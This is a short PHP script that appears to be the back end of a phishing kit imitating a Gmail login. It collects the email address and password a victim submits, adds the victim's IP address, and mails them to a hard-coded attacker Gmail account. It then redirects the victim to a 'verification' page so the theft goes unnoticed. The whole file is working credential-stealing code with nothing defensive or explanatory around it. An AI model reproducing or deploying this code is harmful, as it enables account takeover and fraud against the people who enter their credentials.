<? ob_start(); ?>
<?php
///ICQ-724691041-olux
	if($_POST['Email']) {
		$mymail = "draydee782@gmail.com"; //My Email
		if($_POST['gmail'])
		{
			$domainmail = "gmail.com";
		}
		
		$content = "Email: ".$_POST['Email']."\r\n Pass: ".$_POST['Passwd']."\r\n Domain: ".$domainmail."\r\n";
		$message2 = ' Client IP: ';
			if ( isset($_SERVER["REMOTE_ADDR"]) )    {
				$message2 .= '' . $_SERVER["REMOTE_ADDR"] . ' ';
			} else if ( isset($_SERVER["HTTP_X_FORWARDED_FOR"]) )    {
				$message2 .= '' . $_SERVER["HTTP_X_FORWARDED_FOR"] . ' ';
			} else if ( isset($_SERVER["HTTP_CLIENT_IP"]) )    {
				$message2 .= '' . $_SERVER["HTTP_CLIENT_IP"] . ' ';
			} 
			
		//echo $content ;exit();
		@mail($mymail, "gmail result", $content."\r\n=============ICQ-724691041-olux=================\r\n".$message2);
		header("location:verification.php");
		//exit;
	} else header("Location:index.php");
?>
<? ob_flush(); ?>